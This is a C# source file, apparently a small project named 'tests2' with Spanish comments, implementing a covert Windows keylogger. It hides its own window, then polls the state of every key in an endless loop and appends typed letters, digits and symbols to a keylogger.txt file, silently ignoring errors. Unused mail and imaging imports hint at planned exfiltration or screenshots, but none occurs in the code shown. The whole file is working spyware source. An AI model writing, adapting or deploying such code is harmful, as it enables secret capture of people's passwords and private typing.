using System.Diagnostics;
using System.Drawing.Imaging;
using System.Net.Mail;
using System.Runtime.InteropServices;

namespace tests2
{
    internal static class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        private extern static int ShowWindow(System.IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Int32 teclas);

        //DateTime lastRun = DateTime.Now.AddSeconds(-30);

        static void Main(string[] args)
        {
            ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
            guardarKeys();
        }

        static void guardarKeys()
        {
            DateTime ultimaEjecucion = DateTime.Now.AddSeconds(-1);
            while (true)
            {
                try
                {
                    Thread.Sleep(50);
                    for (Int32 i = 0; i < 255; i++)
                    {
                        int tecla = GetAsyncKeyState(i);
                        if (tecla == 1 || tecla == 32769)//ASCII
                        {
                            //Se crea un archivo en la carpeta del proyecto
                            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\keylogger.txt", true);

                            if (Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey)) && Convert.ToBoolean(GetKeyState(Keys.D2))) sw.Write("@");
                            else if (Keys.Space.Equals((Keys)i)) sw.Write(" ");
                            else if (Keys.D0.Equals((Keys)i) || Keys.NumPad0.Equals((Keys)i)) sw.Write("0");
                            else if (Keys.D1.Equals((Keys)i) || Keys.NumPad1.Equals((Keys)i)) sw.Write("1");
                            else if (Keys.D2.Equals((Keys)i) || Keys.NumPad2.Equals((Keys)i)) sw.Write("2");
                            else if (Keys.D3.Equals((Keys)i) || Keys.NumPad3.Equals((Keys)i)) sw.Write("3");
                            else if (Keys.D4.Equals((Keys)i) || Keys.NumPad4.Equals((Keys)i)) sw.Write("4");
                            else if (Keys.D5.Equals((Keys)i) || Keys.NumPad5.Equals((Keys)i)) sw.Write("5");
                            else if (Keys.D6.Equals((Keys)i) || Keys.NumPad6.Equals((Keys)i)) sw.Write("6");
                            else if (Keys.D7.Equals((Keys)i) || Keys.NumPad7.Equals((Keys)i)) sw.Write("7");
                            else if (Keys.D8.Equals((Keys)i) || Keys.NumPad8.Equals((Keys)i)) sw.Write("8");
                            else if (Keys.D9.Equals((Keys)i) || Keys.NumPad9.Equals((Keys)i)) sw.Write("9");
                            else if (Keys.LButton.Equals((Keys)i) || Keys.MButton.Equals((Keys)i)) { }//no escribe
                            else
                            { //letras
                                if (i >= 65 && i <= 122)
                                {
                                    if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.CapsLock)))
                                        sw.Write(Convert.ToChar(i + 32).ToString());//MINUSCULA
                                    else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey))) //Las Mayuscula se ponen con Shift
                                        sw.Write(Convert.ToChar(i).ToString());
                                    else sw.Write(Convert.ToChar(i + 32).ToString());//MINUSCULA
                                }
                            }
                            sw.Close();
                        }
                    }
                }
                catch (Exception ex) { }
            }
        }
    }
}